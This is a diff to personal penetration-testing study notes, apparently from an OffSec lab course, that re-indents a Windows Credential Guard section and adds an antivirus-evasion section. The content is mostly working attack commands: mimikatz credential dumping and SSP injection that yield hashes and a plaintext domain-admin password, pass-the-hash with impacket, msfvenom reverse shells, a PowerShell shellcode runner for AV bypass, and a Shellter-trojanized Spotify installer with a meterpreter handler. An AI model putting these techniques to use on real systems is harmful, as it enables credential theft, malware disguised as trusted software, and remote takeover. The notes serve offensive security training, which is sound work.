@@ -900,39 +900,119 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
       `dir \\192.168.45.181\test`  
     - Incoming reverse shell successfully > `hostname`  > nt authority\system  
     - `cd "C:\Users\files02admin\Desktop"`
-  - **Windows credential guard**  
-    - Logging in to the **CLIENTWK248** machine as a **Domain Administrator**
-      `xfreerdp3 /u:"CORP\\Administrator" /p:"QWERTY123\!@#" /v:192.168.133.248 /dynamic-resolution` > sign out of administrator  
-    - Logging in to the **CLIENTWK246** as offsec, which is a **local administrator**
-      `xfreerdp3 /u:"offsec" /p:"lab" /v:192.168.133.246 /dynamic-resolution`
-    - Run terminal as Administrator > cd C:\tools\mimikatz\ > .\mimikatz.exe  
-    - Enable SeDebugPrivilege for our local user and then dump all the available credentials with sekurlsa::logonpasswords
-      ```
-      privilege::debug
-      sekurlsa::logonpasswords
+- **Windows credential guard**  
+   - Logging in to the **CLIENTWK248** machine as a **Domain Administrator**
+     `xfreerdp3 /u:"CORP\\Administrator" /p:"QWERTY123\!@#" /v:192.168.133.248 /dynamic-resolution` > sign out of administrator  
+   - Logging in to the **CLIENTWK246** as offsec, which is a **local administrator**
+     `xfreerdp3 /u:"offsec" /p:"lab" /v:192.168.133.246 /dynamic-resolution`
+   - Run terminal as Administrator > cd C:\tools\mimikatz\ > .\mimikatz.exe  
+   - Enable SeDebugPrivilege for our local user and then dump all the available credentials with sekurlsa::logonpasswords
+     ```
+     privilege::debug
+     sekurlsa::logonpasswords
 
-      #hashes
-      NTLM 246 local admin (offsec): 2892d26cdf84d7a70e2eb3b9f05c425e
-      NTLM 248 domain admin (administrator): 160c0b16dd0ee77e7c494e38252f7ddf
-      ```
-    - Gain access to SERVERWK248 machine as CORP\Administrator (pass the hash)
-      `impacket-wmiexec -debug -hashes 00000000000000000000000000000000:160c0b16dd0ee77e7c494e38252f7ddf CORP/Administrator@192.168.50.248`
-    - **Circumvented Credential Guard by injecting SSP through Mimikatz**
-      - Credential Guard is only designed to protect non-local users  
-      - Logging in to the CLIENTWK245 machine as a Domain Administrator that has credential guard
-      - Logging in to the CLIENTWK245 machine as a local adminstrator
-      - windows terminal run as administrator > Get-ComputerInfo > hashes encrypted
-      - Injecting a malicious SSP using Mimikatz
-        ```
-        privilege::debug
-        misc::memssp
-        ```
-      - close the current RDP (wait another user connect to machine) - Logging in to the **CLIENTWK245** machine as a **Domain Administrator**
-      - close the current RDP window and connect to the **CLIENTWK245** as **offsec**
-      - type C:\Windows\System32\mimilsa.log (credentials)  
-        [00000000:00af2311] CORP\Administrator  QWERTY123!@#
+     #hashes
+     NTLM 246 local admin (offsec): 2892d26cdf84d7a70e2eb3b9f05c425e
+     NTLM 248 domain admin (administrator): 160c0b16dd0ee77e7c494e38252f7ddf
+     ```
+   - Gain access to SERVERWK248 machine as CORP\Administrator (pass the hash)
+     `impacket-wmiexec -debug -hashes 00000000000000000000000000000000:160c0b16dd0ee77e7c494e38252f7ddf CORP/Administrator@192.168.50.248`
+   - **Circumvented Credential Guard by injecting SSP through Mimikatz**
+     - Credential Guard is only designed to protect non-local users  
+     - Logging in to the CLIENTWK245 machine as a Domain Administrator that has credential guard
+     - Logging in to the CLIENTWK245 machine as a local adminstrator
+     - windows terminal run as administrator > Get-ComputerInfo > hashes encrypted
+     - Injecting a malicious SSP using Mimikatz
+       ```
+       privilege::debug
+       misc::memssp
+       ```
+     - close the current RDP (wait another user connect to machine) - Logging in to the **CLIENTWK245** machine as a **Domain Administrator**
+     - close the current RDP window and connect to the **CLIENTWK245** as **offsec**
+     - type C:\Windows\System32\mimilsa.log (credentials)  
+       [00000000:00af2311] CORP\Administrator  QWERTY123!@#
 
 ### 16. Antivirus evasion  
+- [VirusTotal](https://www.virustotal.com/): general malware detection, [kleenscan.com](https://kleenscan.com/index): stealth testing, red team AV evasion  
+- AV engines: file, memory, network, disaaembler, emulator/sandbox, browser plugin, machine learning  
+- Detection method: signature, heuristic, behavioral, machine learning   
+  ```
+  sha256sum malware.txt //calculate SHA256 hash of file
+  xxd -b malware.txt  //inspecting the file content with xxd
+  ```
+- Generate malicious PE meterpreter shell
+  `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f exe > binary.exe`
+- Bypass AV detection
+   - on disk (packers, UPX, enigma protector tool)
+   - in-memory (Remote Process Memory Injection, DLL injection, process hollowing, inline hooking)
+
+| Technique                | Description                                                                 | Execution Method                      | Stealth Level | Common APIs Used                                |
+|--------------------------|-----------------------------------------------------------------------------|----------------------------------------|----------------|--------------------------------------------------|
+| **Remote Process Injection** | Inject shellcode into another process’s memory and execute it               | `CreateRemoteThread`, `QueueUserAPC`   | Medium         | `VirtualAllocEx`, `WriteProcessMemory`       |
+| **DLL Injection**            | Inject a DLL into a remote process (standard or reflective)                | `LoadLibrary`, custom loader           | Medium-High    | `VirtualAllocEx`, `CreateRemoteThread`        |
+| **Process Hollowing**        | Replace a legitimate process's memory with malicious code                 | `ResumeThread` after memory swap       | High           | `CreateProcess`, `ZwUnmapViewOfSection`        |
+| **Inline Hooking**          | Overwrite function prologue to redirect execution to attacker's code      | Direct function hijack                 | High           | `VirtualProtect`, `WriteProcessMemory`          |
+
+  - Testing for AV evasion > Virus & threat protection > Manage Settings > disable automatic sample submission  
+  - Evading AV with Threat injection
+    - `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.152 LPORT=443 -f psh-reflection` 
+    - nano bypass.ps1
+      ```
+      $code = '
+      [DllImport("kernel32.dll")]
+      public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+      [DllImport("kernel32.dll")]
+      public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+      [DllImport("msvcrt.dll")]
+      public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
+
+      function mjF6V {
+        Param ($vxG, $ccK)
+        $ag = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+
+        return $ag.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object   System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($ag.GetMethod('GetModuleHandle')).Invoke($null, @($vxG)))), $ccK))
+       }
+
+       [Place the payload here]
+       ```
+      - `PS C:\Users\offsec\Desktop> .\bypass.ps1`  
+      - `Get-ExecutionPolicy -Scope CurrentUser`  
+      - `Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser`
+      - `nc -lvnp 443`
+      - `.\bypass.ps1`
+      - receiving a reverse shell on netcat listener: `C:\Users\offsec>whoami`  
+  - Automating the process
+    - `apt-cache search shellter`
+    - `sudo apt install shellter`
+    - install wine
+      ```
+      sudo apt install wine
+      sudo dpkg --add-architecture i386 && apt-get update && apt-get install wine32
+      sudo apt install wine
+      sudo dpkg --add-architecture amd64
+      sudo  apt install -y qemu-user-static binfmt-support
+      sudo apt-get update && apt-get install wine32
+      ```
+    - `shellter`
+      ```
+      Choose Operation Mode - Auto/Manual (A/M/H): A
+      PE Target: /home/kali/Downloads/SpotifyFullWin10-32bit.exe
+      Enable Stealth Mode? (Y/N/H): Y
+      Use a listed payload or custom? (L/C/H): L
+      Select payload by index: 1
+      SET LHOST: 192.168.45.152
+      SET LPORT: 443
+      ```
+    - Before transferring the file, setting up a handler for the meterpreter payload
+      `msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.45.152;set LPORT 443;run;"`  
+    - Transfer the file `ftp -A 192.168.245.53`  `ftp> bin` `put SpotifyFullWin10-32bit.exe`  
+    - meterpreter session open
+      ```
+      meterpreter > shell
+      C:\Users\offsec\Desktop>whoami
+      ```
 
 
 ### 17. Windows Privilege Escalation
